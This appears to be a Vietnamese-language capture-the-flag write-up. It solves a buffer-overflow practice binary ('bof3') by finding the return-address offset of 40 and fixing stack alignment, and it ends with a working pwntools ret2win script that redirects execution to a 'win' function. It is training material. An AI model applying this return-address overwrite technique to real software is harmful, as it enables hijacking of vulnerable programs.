![image](https://github.com/user-attachments/assets/749b0f09-acb9-484e-b970-1dfbe1737059)![image](https://github.com/user-attachments/assets/362d5b7d-e00d-4587-8c27-dec937e15652)![image](https://github.com/user-attachments/assets/eaa2aa7a-3e7a-4bb8-b9c4-e58b44e2160a)![image](https://github.com/user-attachments/assets/38ede511-12c4-4a7e-bb71-22f1213fa4df)
* Đầu tiên đọc code ta thấy biến buf khai báo 28 byte nhưng lại nhập vào tận 48 byte như vậy ta có lỗi Buffer_Overflow ở đây
![image](https://github.com/user-attachments/assets/cfa7f7d3-0cdd-4e6f-85bd-a2e33beb0b55)
* Đặt break_point tại hàm read hàm read.
* Hàm read cho chúng ta nhập vào 48 byte nên chúng ta thử nhập 48 byte coi nó tràn được đến đâu
![image](https://github.com/user-attachments/assets/5510eef0-4053-487f-b6d6-51bdbea2d339)
![image](https://github.com/user-attachments/assets/2b2e509b-0f3c-4706-9c7a-b210ecbad575)
* Đi đến hàm return ta thấy nó đã ơverdrive đến địa chỉ 0x6161616161616166
* ![image](https://github.com/user-attachments/assets/a59f5be2-113e-40c8-bde4-24f612a2648d)
* Vậy bây giờ mình cần tìm offset nó để overdrive đến cái mình muốn
![image](https://github.com/user-attachments/assets/33edd7a4-ce5c-4ce8-8f18-013afcdf0985)
* Offset ở đây là 40
* ![image](https://github.com/user-attachments/assets/068083de-69cb-424f-865e-7b75ea204706)
* Thử viết payload để overdrive nó nhưng ở đây chúng ta gặp lỗi EOF
![image](https://github.com/user-attachments/assets/2cabc139-b0b4-41bb-91cd-baa8e6deca20)
* Tìm địa chỉ của hàm return để đặt breakpoint địa chỉ là 0x0000000000401248
![image](https://github.com/user-attachments/assets/5a531574-4aaf-4d9c-a1f0-20bde0f7bc5e)
* Hàm tiếp theo đã được thực thi hàm tiếp theo nó nhảy vào là hàm win địa chỉ 0x00007fffc7249058
* ![image](https://github.com/user-attachments/assets/151f421e-cd10-4010-9016-4ca99a58e092)
* Chạy tiếp chúng ta gặp lỗi, lỗi này là do địa chỉ stack ko chia hết cho 16
![image](https://github.com/user-attachments/assets/28f1070d-7819-4536-a04b-4272495eb02c)
* Như vậy ta cần đưa nó đến byte chia hết cho 16 như vậy payload là :
<pre>
  from pwn import *
 
p = process('./bof3')

exe = ELF("./bof3")

payload = b'A'*40
payload += p64(exe.sym['win'] + 5)
p.sendafter(b'> ',payload)

p.interactive()

</pre>
